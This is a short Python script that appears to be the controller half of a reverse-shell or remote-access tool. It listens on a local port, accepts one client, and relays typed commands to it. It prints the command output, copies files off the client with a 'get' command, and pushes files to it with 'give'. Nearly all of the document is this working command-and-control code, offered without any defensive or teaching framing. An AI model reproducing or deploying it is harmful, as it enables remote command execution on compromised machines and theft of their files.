import socket

HOST = '127.0.0.1' 
PORT = 8081 
server = socket.socket()
server.bind((HOST, PORT))
print('[+] Server Started')
print('[+] Listening For Client Connection ...')
server.listen(1)
client, client_addr = server.accept()
print(f'[+] {client_addr} Client connected to the server')

while True:
    try:
        command = input('Enter Command : ')
        command_args = command.split(' ')
        command = command.encode()
        if 'get' in command_args[0]:
            client.send(command)
            print('[+] Command sent')
            output = client.recv(1024)
            with open(command_args[1], 'wb') as file:
                file.write(output)

        if 'give' in command_args[0]:
            print('[+] Command sent')
            with open(command_args[1], 'rb') as file:
                command += b" " + (file.read())
                client.send(command)
            output = client.recv(1024)

        else:
            client.send(command)
            print('[+] Command sent')
            output = client.recv(1024)
            output = output.decode()
            print(f"Output: {output}")

    except KeyboardInterrupt:
        client.send('ccon'.encode())
        server.close()
        exit()